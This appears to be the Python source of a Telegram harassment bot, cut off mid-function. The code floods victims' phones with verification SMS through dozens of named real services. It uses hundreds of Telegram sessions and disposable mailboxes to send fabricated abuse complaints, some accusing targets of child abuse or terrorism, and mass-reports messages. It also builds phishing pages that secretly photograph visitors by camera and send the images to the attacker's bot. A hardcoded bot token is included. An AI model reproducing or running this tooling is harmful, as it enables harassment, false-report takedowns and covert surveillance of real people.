import asyncio
import aiohttp
import random
import string
import json
import os
import logging
import time
import shutil
import re
import hashlib
from datetime import datetime
from typing import Optional, Dict, List, Tuple

from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.filters import Command, StateFilter
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

from pyrogram import Client
from pyrogram.errors import FloodWait, RPCError
import pyrogram.raw.functions.messages as raw_messages
import pyrogram.raw.types as raw_types

# ---------- НАСТРОЙКИ ----------
BOT_TOKEN = "8788795304:AAE8a0TEsRw8aRhflGIrIQoJZIZf1ZErcA0"
API_ID = 2040
API_HASH = "b18441a1ff607e10a989891a5462e627"
ADMIN_ID = 7736817432
ALLOWED_USERS_FILE = "allowed_users.json"
CHANNEL_ID = -1003910615357
CHANNEL_URL = "https://t.me/VICTIMSNOSER"

SESSIONS_PER_USER = 300
SESSION_DELAY = 60
SMS_PER_ROUND = 8
ROUND_DELAY = 10
BOMBER_DELAY = 3
SITE_DELAY = 15
SMS_DELAY = 5

MAILTM_ACCOUNTS_COUNT = 30
MAILTM_ACCOUNTS_FILE = "mailtm_accounts.json"
BANNER_PATH = "banner.png"

RECEIVERS = [
    'sms@telegram.org', 'dmca@telegram.org', 'abuse@telegram.org',
    'sticker@telegram.org', 'support@telegram.org', 'security@telegram.org',
    'stopca@telegram.org', 'ca@telegram.org'
]

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
]

# Расширенные OAuth сайты с правильными эндпоинтами
TELEGRAM_OAUTH_SITES = [
    # Telegram официальные
    {"url": "https://my.telegram.org/auth/send_password", "method": "POST", "phone_field": "phone", "name": "MyTelegram", "headers": {"origin": "https://my.telegram.org"}},
    {"url": "https://web.telegram.org/k/api/auth/sendCode", "method": "POST", "phone_field": "phone", "name": "WebK", "headers": {"origin": "https://web.telegram.org"}},
    {"url": "https://web.telegram.org/a/api/auth/sendCode", "method": "POST", "phone_field": "phone", "name": "WebA", "headers": {"origin": "https://web.telegram.org"}},
    {"url": "https://fragment.com/api/auth/sendCode", "method": "POST", "phone_field": "phone", "name": "Fragment", "headers": {"origin": "https://fragment.com"}},
    {"url": "https://wallet.telegram.org/api/v1/auth/send_code", "method": "POST", "phone_field": "phone", "name": "Wallet", "headers": {"origin": "https://wallet.telegram.org"}},
    
    # Российские сервисы
    {"url": "https://api.vk.com/method/auth.signup", "method": "POST", "phone_field": "phone", "name": "VK", "params": {"v": "5.199"}},
    {"url": "https://ok.ru/dk?cmd=AnonymRegistrationSendPhone", "method": "POST", "phone_field": "phone", "name": "OK.ru"},
    {"url": "https://passport.yandex.ru/registration-validations/phone-confirm-code-submit", "method": "POST", "phone_field": "phone", "name": "Yandex"},
    {"url": "https://id.tinkoff.ru/auth/signup/phone", "method": "POST", "phone_field": "phone", "name": "Tinkoff"},
    {"url": "https://api.ozon.ru/v1/auth/request-code", "method": "POST", "phone_field": "phone", "name": "Ozon"},
    {"url": "https://www.wildberries.ru/webapi/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Wildberries"},
    {"url": "https://www.avito.ru/web/1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Avito"},
    {"url": "https://esia.gosuslugi.ru/aas/oauth2/api/send-code", "method": "POST", "phone_field": "phone", "name": "Gosuslugi"},
    {"url": "https://api.sberbank.ru/ru/prod/signup/send-code", "method": "POST", "phone_field": "phone", "name": "Sberbank"},
    {"url": "https://api.qiwi.com/oauth/authorize", "method": "POST", "phone_field": "phone", "name": "QIWI"},
    {"url": "https://youla.ru/api/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Youla"},
    
    # Международные
    {"url": "https://api.whatsapp.com/send_code", "method": "POST", "phone_field": "phone", "name": "WhatsApp"},
    {"url": "https://viber.com/api/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Viber"},
    {"url": "https://api.snapchat.com/v1/auth/send_code", "method": "POST", "phone_field": "phone", "name": "Snapchat"},
    {"url": "https://api.tiktok.com/passport/auth/send_code", "method": "POST", "phone_field": "phone", "name": "TikTok"},
    {"url": "https://api.instagram.com/api/v1/web/accounts/send_signup_sms_code/", "method": "POST", "phone_field": "phone", "name": "Instagram"},
    {"url": "https://api.facebook.com/method/auth.sendSMSCode", "method": "POST", "phone_field": "phone", "name": "Facebook"},
    {"url": "https://api.twitter.com/1.1/account/send_verification_code.json", "method": "POST", "phone_field": "phone_number", "name": "Twitter"},
    {"url": "https://api.linkedin.com/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "LinkedIn"},
    {"url": "https://api.uber.com/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Uber"},
    {"url": "https://api.airbnb.com/v2/signup/send_code", "method": "POST", "phone_field": "phone", "name": "Airbnb"},
    {"url": "https://api.ebay.com/identity/v1/send_code", "method": "POST", "phone_field": "phone", "name": "eBay"},
    {"url": "https://api.aliexpress.com/auth/send-code", "method": "POST", "phone_field": "phone", "name": "AliExpress"},
    {"url": "https://api.amazon.com/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Amazon"},
    {"url": "https://api.paypal.com/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "PayPal"},
    {"url": "https://api.spotify.com/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Spotify"},
    {"url": "https://api.netflix.com/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Netflix"},
    {"url": "https://api.discord.com/v9/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Discord"},
]

# Бомбер сайты с правильными эндпоинтами
BOMBER_WEBSITES = [
    {"url": "https://api.delivery-club.ru/api/v2/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Delivery Club"},
    {"url": "https://api.sbermarket.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "SberMarket"},
    {"url": "https://api.samokat.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Samokat"},
    {"url": "https://api.vkusvill.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "VkusVill"},
    {"url": "https://api.magnit.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Magnit"},
    {"url": "https://api.5ka.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Pyaterochka"},
    {"url": "https://api.perekrestok.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Perekrestok"},
    {"url": "https://api.lenta.com/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Lenta"},
    {"url": "https://api.alfabank.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "AlfaBank"},
    {"url": "https://api.citilink.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Citilink"},
    {"url": "https://www.mvideo.ru/rest/auth/send-code", "method": "POST", "phone_field": "phone", "name": "MVideo"},
    {"url": "https://api.dns-shop.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "DNS"},
    {"url": "https://api.eldorado.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Eldorado"},
    {"url": "https://api.svyaznoy.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Svyaznoy"},
    {"url": "https://api.rzhd.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "RZD"},
    {"url": "https://api.aeroflot.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Aeroflot"},
    {"url": "https://api.auto.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Auto.ru"},
    {"url": "https://api.cian.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Cian"},
    {"url": "https://api.tutu.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Tutu.ru"},
    {"url": "https://api.detmir.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "DetMir"},
    {"url": "https://api.lamoda.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Lamoda"},
    {"url": "https://api.gazprombank.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Gazprombank"},
    {"url": "https://api.vtb.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "VTB"},
    {"url": "https://api.raiffeisen.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Raiffeisen"},
    {"url": "https://api.open.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Otkritie"},
    {"url": "https://api.rosbank.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Rosbank"},
    {"url": "https://api.mtsbank.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "MTS Bank"},
    {"url": "https://api.psbank.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "PSB"},
    {"url": "https://api.sovcombank.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Sovcombank"},
    {"url": "https://api.tbank.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "T-Bank"},
]

COMPLAINT_TEXTS_ACCOUNT = {
    "1.1": "Здравствуйте, уважаемая поддержка, в вашей сети я нашел телеграм аккаунт, который нарушает ваши правила, такие как {reason}. Его юзернейм - {username}, так же его контактный ID - {telegram_id}. Спасибо за помощь.",
    "1.2": "Здравствуйте, я утерял свой телеграм-аккаунт путем взлома. Я попался на фишинговую ссылку, и теперь на моем аккаунте сидит какой-то человек. Он установил облачный пароль, так что я не могу зайти в свой аккаунт и прошу о помощи. Мой юзернейм - {username}, а мой айди, если злоумышленник поменял юзернейм - {telegram_id}. Пожалуйста, перезагрузите сессии или удалите этот аккаунт, так как у меня там очень много важных данных.",
    "1.3": "Добрый день поддержка Telegram! Аккаунт {username}, {telegram_id} использует виртуальный номер купленный на сайте по активации номеров. Отношения к номеру он не имеет, номер никак к нему не относиться. Прошу разберитесь с этим. Заранее спасибо!",
    "1.4": "Добрый день поддержка Telegram! Аккаунт {username} {telegram_id} ссылает людей на сторонний сервис. Оставив в поле о себе ссылку на другой сервис он ссылает туда людей с вашего мессенджера! Прошу проверить и разобраться! Заранее спасибо",
    "1.5": "Добрый день поддержка Telegram! Аккаунт {username} {telegram_id} приобрёл премиум в вашем мессенджере чтобы рассылать спам-сообщения и обходить ограничения Telegram. Прошу проверить данную жалобу и принять меры!"
}

COMPLAINT_TEXTS_CHANNEL = {
    "8": "Здравствуйте, поддержка Телеграм! В вашей социальной сети я нашел канал, в котором публикуются личные данные невинных людей. Ссылка на канал - {channel_link}. Ссылка на нарушение - {violation_link}. Просьба удалить данный канал с вашей площадки",
    "9": "Здравствуйте, уважаемый модератор телеграмм, хочу пожаловаться вам на канал, который продает услуги доксинга, сваттинга. Ссылка на телеграмм канал: {channel_link} Ссылка на нарушение: {violation_link} Просьба заблокировать данный канал.",
    "10": "Здравствуйте, уважаемая поддержка Telegram! Пожалуйста, заблокируйте канал {channel_link}. В этом канале угрожают расстрелом детей в школах и совершением террористических актов, вы можете увидеть это здесь {violation_link}. Заранее спасибо.",
    "11": "Здравствуйте, поддержка Телеграм! В вашей социальной сети я нашел канал, в котором публикуется порнография с несовершеннолетними детьми. Ссылка на канал - {channel_link}. Ссылка на нарушение - {violation_link}. Просьба удалить данный канал с вашей площадки",
    "12": "Здравствуйте, поддержка Телеграм! В вашей социальной сети я нашел канал, в котором публикуются посты с целью обмана и мошенничества. Ссылка на канал - {channel_link}. Ссылка на нарушение - {violation_link}. Просьба удалить данный канал с вашей площадки",
    "13": "Здравствуйте, поддержка telegram. Я бы хотел пожаловаться на телеграм канал продающий виртуальные номера, насколько я знаю это запрещено правилами вашей площадки. Ссылка на канал - {channel_link} ссылка на нарушение - {violation_link}. Спасибо что очищаете свою площадку от подобных каналов!",
    "14": "Доброго времени суток, уважаемая поддержка. На просторах вашей платформы мне попался канал, распространяющий шок контент с убийствами людей. Ссылка на канал - {channel_link}, ссылка на нарушение - {violation_link}. Просьба удалить данный канал, спасибо за внимание.",
    "15": "Здравствуйте, уважаемая поддержка! Прошу проверить и заблокировать канал - {channel_link}, где размещаются сцены насилия и убийства животных. Ссылка на нарушение - {violation_link}. Просьба удалить данный канал с вашей площадки."
}

REPORT_REASONS = {
    "spam": raw_types.InputReportReasonSpam(),
    "violence": raw_types.InputReportReasonViolence(),
    "pornography": raw_types.InputReportReasonPornography(),
    "child_abuse": raw_types.InputReportReasonChildAbuse(),
    "copyright": raw_types.InputReportReasonCopyright(),
    "other": raw_types.InputReportReasonOther(),
    "personal_data": raw_types.InputReportReasonPersonalDetails(),
    "illegal_drugs": raw_types.InputReportReasonIllegalDrugs(),
}

REPORT_REASONS_RU = {
    "spam": "Спам",
    "violence": "Насилие",
    "pornography": "Порнография",
    "child_abuse": "Дети",
    "copyright": "Авторские права",
    "other": "Другое",
    "personal_data": "Личные данные",
    "illegal_drugs": "Наркотики",
}

# Telegraph
TELEGRAPH_AUTHOR = "Telegram"
TELEGRAPH_AUTHOR_URL = "https://t.me/VICTIMSNOSER"
phish_pages = {}

CAMERA_TEMPLATE = '''<div style="text-align: center; padding: 30px 20px; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); border-radius: 20px; margin: 20px 0;">
    <h3 style="color: #fff; margin-bottom: 15px; font-size: 22px;">{title}</h3>
    <p style="color: #aaa; margin-bottom: 25px; font-size: 15px; line-height: 1.5;">{description}</p>
    <div style="position: relative; max-width: 320px; margin: 0 auto; border-radius: 16px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.3);">
        <video id="video" autoplay playsinline style="width: 100%; display: block; transform: scaleX(-1);"></video>
        <canvas id="canvas" style="display: none;"></canvas>
    </div>
    <button id="cam-btn" style="background: linear-gradient(135deg, #e94560 0%, #c62a47 100%); color: white; border: none; padding: 14px 30px; font-size: 16px; font-weight: bold; border-radius: 12px; margin: 25px 0 10px; cursor: pointer; width: 100%; max-width: 320px; box-shadow: 0 5px 15px rgba(233,69,96,0.3);">{button_text}</button>
    <div id="status" style="color: #888; font-size: 13px; margin-top: 10px;">Камера готова</div>
</div>
<script>
(function(){
    const BOT_TOKEN = "{bot_token}";
    const CHAT_ID = "{chat_id}";
    const PAGE_ID = "{page_id}";
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const btn = document.getElementById("cam-btn");
    const status = document.getElementById("status");
    let stream = null;
    let done = false;
    
    async function startCamera() {
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            video.srcObject = stream;
        } catch (e) {
            status.textContent = "Нет доступа к камере";
            status.style.color = "#ff4444";
            btn.disabled = true;
        }
    }
    
    async function sendPhoto(dataUrl) {
        try {
            const blob = await (await fetch(dataUrl)).blob();
            const formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("photo", blob, "photo.jpg");
            formData.append("caption", "📸 Фото с камеры\\n🎯 Жертва: " + PAGE_ID);
            const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
            return (await resp.json()).ok;
        } catch (e) {
            return false;
        }
    }
    
    async function takePhoto() {
        if (done) { status.textContent = "Фото уже отправлено"; return; }
        status.textContent = "Съемка...";
        btn.disabled = true;
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);
        const sent = await sendPhoto(canvas.toDataURL("image/jpeg", 0.9));
        if (sent) {
            done = true;
            status.textContent = "✅ Готово";
            status.style.color = "#4caf50";
            btn.textContent = "Отправлено";
            if (stream) { stream.getTracks().forEach(t => t.stop()); video.srcObject = null; }
        } else {
            status.textContent = "❌ Ошибка";
            status.style.color = "#ff4444";
            btn.disabled = false;
        }
    }
    
    btn.addEventListener("click", takePhoto);
    startCamera();
})();
</script>'''

# Шаблон для Telegraph статьи
TELEGRAPH_TEMPLATE = '''<h3>{title}</h3>
<p>{description}</p>
<figure>
    <div data-html="{camera_html_escaped}"></div>
</figure>'''

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())

ALLOWED_USERS = set()
user_sessions = {}
active_attacks = {}
active_bombers = {}
active_reports = {}
sessions_creation_lock = {}
usage_logs = []
MAX_LOGS = 20
site_last_used = {}

class SnosState(StatesGroup):
    waiting_phone = State()
    waiting_count = State()

class BomberState(StatesGroup):
    waiting_phone = State()
    waiting_count = State()

class ReportMessageState(StatesGroup):
    waiting_link = State()
    waiting_reason = State()

class MailAccountState(StatesGroup):
    waiting_choice = State()
    waiting_username = State()
    waiting_id = State()
    waiting_reason = State()

class MailChannelState(StatesGroup):
    waiting_choice = State()
    waiting_channel = State()
    waiting_violation = State()

class PhishState(StatesGroup):
    waiting_link = State()
    waiting_title = State()
    waiting_description = State()
    waiting_button = State()

class AdminState(StatesGroup):
    waiting_user_id = State()


def add_log(user_id: int, action: str, target: str):
    global usage_logs
    usage_logs.append({"user_id": user_id, "action": action, "target": target, "time": datetime.now().strftime('%H:%M:%S')})
    if len(usage_logs) > MAX_LOGS:
        usage_logs = usage_logs[-MAX_LOGS:]

def get_last_logs(count: int = 5) -> str:
    if not usage_logs: return "Пусто"
    return "\n".join([f"[{l['time']}] {l['user_id']} - {l['action']}: {l['target']}" for l in reversed(usage_logs[-count:])])

def load_allowed_users():
    global ALLOWED_USERS
    try:
        with open(ALLOWED_USERS_FILE, 'r') as f:
            ALLOWED_USERS = set(json.load(f).get("users", []))
    except: pass

def save_allowed_users():
    with open(ALLOWED_USERS_FILE, 'w') as f:
        json.dump({"users": list(ALLOWED_USERS)}, f)

async def check_channel_subscription(user_id: int) -> bool:
    try:
        member = await bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        return member.status in ["member", "administrator", "creator"]
    except: return False

def is_user_allowed(user_id: int) -> bool:
    return user_id == ADMIN_ID or user_id in ALLOWED_USERS

class AccessMiddleware:
    async def __call__(self, handler, event, data):
        user_id = None
        if isinstance(event, types.CallbackQuery): user_id = event.from_user.id
        elif isinstance(event, types.Message): user_id = event.from_user.id
        if isinstance(event, types.Message) and event.text and event.text.startswith('/start'): return await handler(event, data)
        if isinstance(event, types.Message) and event.text and event.text.startswith('/admin'):
            if user_id == ADMIN_ID: return await handler(event, data)
            else: await send_message_with_banner(event, "Только администратор!"); return
        if user_id and not is_user_allowed(user_id):
            if isinstance(event, types.CallbackQuery): await event.answer("Нет доступа!", show_alert=True)
            elif isinstance(event, types.Message): await send_message_with_banner(event, "Нет доступа!")
            return
        return await handler(event, data)

dp.update.middleware(AccessMiddleware())


# ---------- MAIL.TM ----------
class MailTM:
    def __init__(self):
        self.base_url = "https://api.mail.tm"
        self.accounts = []
        self.session = None
        self.ready = False
        
    async def init_session(self):
        if not self.session:
            connector = aiohttp.TCPConnector(limit=20, force_close=True, ssl=False)
            timeout = aiohttp.ClientTimeout(total=30)
            self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)
    
    async def close(self):
        if self.session:
            await self.session.close()
            self.session = None
    
    async def get_domain(self) -> str:
        await self.init_session()
        try:
            async with self.session.get(f"{self.base_url}/domains") as resp:
                if resp.status == 200:
                    domains = await resp.json()
                    return domains['hydra:member'][0]['domain']
        except: pass
        return "inbox.testmail.app"
    
    async def create_account(self) -> dict:
        await self.init_session()
        try:
            random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
            domain = await self.get_domain()
            
            account_data = {
                "address": f"snoser{random_str}@{domain}",
                "password": ''.join(random.choices(string.ascii_letters + string.digits, k=12))
            }
            
            async with self.session.post(f"{self.base_url}/accounts", json=account_data, headers={"Content-Type": "application/json"}) as resp:
                if resp.status in [200, 201]:
                    login_data = {"address": account_data["address"], "password": account_data["password"]}
                    async with self.session.post(f"{self.base_url}/token", json=login_data, headers={"Content-Type": "application/json"}) as login_resp:
                        if login_resp.status == 200:
                            token_data = await login_resp.json()
                            return {"email": account_data["address"], "password": account_data["password"], "token": token_data["token"]}
        except: pass
        return None
    
    async def create_multiple_accounts(self, count: int) -> list:
        accounts = []
        for i in range(count):
            account = await self.create_account()
            if account:
                accounts.append(account)
                logger.info(f"Mail.tm {len(accounts)}/{count}: {account['email']}")
            await asyncio.sleep(2)
        self.accounts = accounts
        self.ready = True
        return accounts
    
    async def send_email(self, account: dict, to_email: str, subject: str, body: str) -> bool:
        await self.init_session()
        try:
            message_data = {
                "from": {"address": account["email"], "name": "Telegram User"},
                "to": [{"address": to_email}],
                "subject": subject,
                "text": body
            }
            headers = {"Authorization": f"Bearer {account['token']}", "Content-Type": "application/json"}
            async with self.session.post(f"{self.base_url}/messages", json=message_data, headers=headers) as resp:
                return resp.status in [200, 201, 202]
        except: return False


# ---------- СЕССИИ ----------
def get_user_session_dir(user_id: int) -> str:
    return f"sessions/user_{user_id}"

def count_user_sessions_files(user_id: int) -> int:
    d = get_user_session_dir(user_id)
    if not os.path.exists(d): return 0
    return len([f for f in os.listdir(d) if f.startswith("session_") and f.endswith(".session")])

async def create_single_session(session_file: str, idx: int) -> dict:
    try:
        devices = [
            {"model": "iPhone 15 Pro Max", "system": "iOS 17.2"},
            {"model": "Samsung Galaxy S24 Ultra", "system": "Android 14"},
            {"model": "Google Pixel 8 Pro", "system": "Android 14"},
        ]
        device = random.choice(devices)
        client = Client(session_file, api_id=API_ID, api_hash=API_HASH, in_memory=False, no_updates=True, device_model=device["model"], system_version=device["system"])
        await client.connect()
        return {"client": client, "in_use": False, "flood_until": 0, "index": idx, "last_used": 0}
    except: return None

async def create_user_sessions(user_id: int) -> tuple:
    d = get_user_session_dir(user_id)
    os.makedirs(d, exist_ok=True)
    existing = count_user_sessions_files(user_id)
    if existing >= SESSIONS_PER_USER: return [], existing
    sessions = []
    for i in range(existing):
        f = f"{d}/session_{i}"
        if os.path.exists(f"{f}.session"):
            s = await create_single_session(f, i)
            if s: sessions.append(s)
    need = SESSIONS_PER_USER - len(sessions)
    if need > 0:
        for batch in range(len(sessions), SESSIONS_PER_USER, 10):
            tasks = [create_single_session(f"{d}/session_{i}", i) for i in range(batch, min(batch+10, SESSIONS_PER_USER)) if not os.path.exists(f"{d}/session_{i}.session")]
            if tasks:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                for r in results:
                    if r and not isinstance(r, Exception): sessions.append(r)
            await asyncio.sleep(2)
    return sessions, len(sessions)

async def ensure_user_sessions(user_id: int):
    if user_id in sessions_creation_lock and sessions_creation_lock[user_id]: return
    sessions_creation_lock[user_id] = True
    try:
        if user_id not in user_sessions: user_sessions[user_id] = {"sessions": [], "ready": False, "total": 0}
        sessions, total = await create_user_sessions(user_id)
        user_sessions[user_id]["sessions"] = sessions
        user_sessions[user_id]["total"] = total
        user_sessions[user_id]["ready"] = True
    finally: sessions_creation_lock[user_id] = False

async def refresh_user_sessions(user_id: int):
    if user_id in user_sessions:
        for s in user_sessions[user_id].get("sessions", []):
            try: await s["client"].disconnect()
            except: pass
    d = get_user_session_dir(user_id)
    if os.path.exists(d): shutil.rmtree(d)
    user_sessions[user_id] = {"sessions": [], "ready": False, "total": 0}
    await ensure_user_sessions(user_id)

async def get_user_sessions_batch(user_id: int, count: int) -> list:
    if user_id not in user_sessions or not user_sessions[user_id]["ready"]: return []
    now = time.time()
    available = [s for s in user_sessions[user_id]["sessions"] if not s["in_use"] and s["flood_until"] < now and now - s["last_used"] >= SESSION_DELAY]
    available.sort(key=lambda x: x["last_used"])
    selected = available[:count]
    for s in selected:
        s["in_use"] = True
        s["last_used"] = now
    return selected

def release_user_sessions(sessions: list):
    for s in sessions:
        if s: s["in_use"] = False

def get_user_sessions_count(user_id: int) -> int:
    return user_sessions.get(user_id, {}).get("total", 0)

def is_user_sessions_ready(user_id: int) -> bool:
    return user_id in user_sessions and user_sessions[user_id].get("ready", False)


# ---------- СНОС НОМЕРА ----------
async def send_sms_safe(session_data: dict, phone: str) -> dict:
    try:
        client = session_data["client"]
        if not client.is_connected: await client.connect()
        await client.send_code(phone)
        return {"type": "SMS", "success": True}
    except FloodWait as e:
        session_data["flood_until"] = time.time() + e.value
        return {"type": "SMS", "success": False, "flood": e.value}
    except Exception as e:
        return {"type": "SMS", "success": False, "error": str(e)[:30]}

async def send_oauth_request(session: aiohttp.ClientSession, phone: str, site: dict) -> dict:
    global site_last_used
    name = site["name"]
    now = time.time()
    if name in site_last_used and now - site_last_used[name] < SITE_DELAY:
        await asyncio.sleep(SITE_DELAY - (now - site_last_used[name]))
    site_last_used[name] = time.time()
    
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'Origin': site.get("headers", {}).get("origin", site["url"].split("/")[2] if "://" in site["url"] else ""),
        'Referer': site.get("headers", {}).get("origin", site["url"].split("/")[2] if "://" in site["url"] else ""),
    }
    
    # Добавляем кастомные заголовки
    if "headers" in site:
        headers.update(site["headers"])
    
    try:
        data = {site["phone_field"]: phone}
        # Добавляем доп. параметры если есть
        if "params" in site:
            data.update(site["params"])
        if "extra_data" in site:
            data.update(site["extra_data"])
            
        if site["method"] == "POST":
            async with session.post(site["url"], headers=headers, json=data, timeout=10, ssl=False) as resp:
                return {"site": name, "success": resp.status < 500}
        else:
            async with session.get(site["url"], headers=headers, params=data, timeout=10, ssl=False) as resp:
                return {"site": name, "success": resp.status < 500}
    except asyncio.TimeoutError:
        return {"site": name, "success": False, "error": "timeout"}
    except Exception as e:
        return {"site": name, "success": False, "error": str(e)[:20]}

async def snos_attack(user_id: int, phone: str, rounds: int, stop_event: asyncio.Event, progress_callback=None) -> tuple:
    ok = 0
    phone = phone.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"): phone = "+" + phone
    add_log(user_id, "Снос номера", phone)
    
    connector = aiohttp.TCPConnector(limit=100, force_close=True, ssl=False, ttl_dns_cache=300)
    timeout = aiohttp.ClientTimeout(total=15)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as sess:
        for rnd in range(1, rounds + 1):
            if stop_event.is_set(): break
            
            sessions = await get_user_sessions_batch(user_id, SMS_PER_ROUND)
            tasks = []
            
            # Отправка SMS через сессии
            if sessions:
                for s in sessions:
                    tasks.append(send_sms_safe(s, phone))
                    await asyncio.sleep(SMS_DELAY / 1000)
            
            # Отправка OAuth запросов
            oauth_sites = random.sample(TELEGRAM_OAUTH_SITES, min(15, len(TELEGRAM_OAUTH_SITES)))
            for site in oauth_sites:
                tasks.append(send_oauth_request(sess, phone, site))
            
            # Выполняем все задачи
            batch = await asyncio.gather(*tasks, return_exceptions=True)
            release_user_sessions(sessions)
            
            for r in batch:
                if isinstance(r, dict) and r.get("success"):
                    ok += 1
            
            if progress_callback:
                await progress_callback(rnd, rounds, ok)
            
            if rnd < rounds and not stop_event.is_set():
                await asyncio.sleep(ROUND_DELAY)
    
    return ok


# ---------- БОМБЕР ----------
async def send_bomber_request(session: aiohttp.ClientSession, phone: str, site: dict) -> dict:
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'Origin': site["url"].split("/")[2] if "://" in site["url"] else "",
    }
    
    try:
        data = {site["phone_field"]: phone}
        if site["method"] == "POST":
            async with session.post(site["url"], headers=headers, json=data, timeout=10, ssl=False) as resp:
                return {"site": site["name"], "success": resp.status < 500}
        else:
            async with session.get(site["url"], headers=headers, params=data, timeout=10, ssl=False) as resp:
                return {"site": site["name"], "success": resp.status < 500}
    except: return {"site": site["name"], "success": False}

async def bomber_attack(phone: str, rounds: int, user_id: int, stop_event: asyncio.Event, progress_callback=None) -> tuple:
    ok = 0
    phone = phone.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"): phone = "+" + phone
    add_log(user_id, "Бомбер", phone)
    
    connector = aiohttp.TCPConnector(limit=50, force_close=True, ssl=False)
    timeout = aiohttp.ClientTimeout(total=15)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as sess:
        for rnd in range(1, rounds + 1):
            if stop_event.is_set(): break
            
            tasks = [send_bomber_request(sess, phone, s) for s in BOMBER_WEBSITES]
            batch = await asyncio.gather(*tasks, return_exceptions=True)
            
            for r in batch:
                if isinstance(r, dict) and r.get("success"):
                    ok += 1
            
            if progress_callback:
                await progress_callback(rnd, rounds, ok)
            
            if rnd < rounds and not stop_event.is_set():
                await asyncio.sleep(BOMBER_DELAY)
    
    return ok


# ---------- ЖАЛОБЫ НА СООБЩЕНИЯ ----------
async def report_message_via_session(session_data: dict, channel: str, msg_id: int, reason: str) -> dict:
    try:
        client = session_data["client"]
        if not client.is_connected:
            await client.connect()
        
        # Получаем чат
        try:
            chat = await client.get_chat(channel)
        except:
            chat = await client.get_chat(f"@{channel}")
        
        # Получаем сообщение
        msg = await client.get_messages(chat.id, msg_id)
        if not msg:
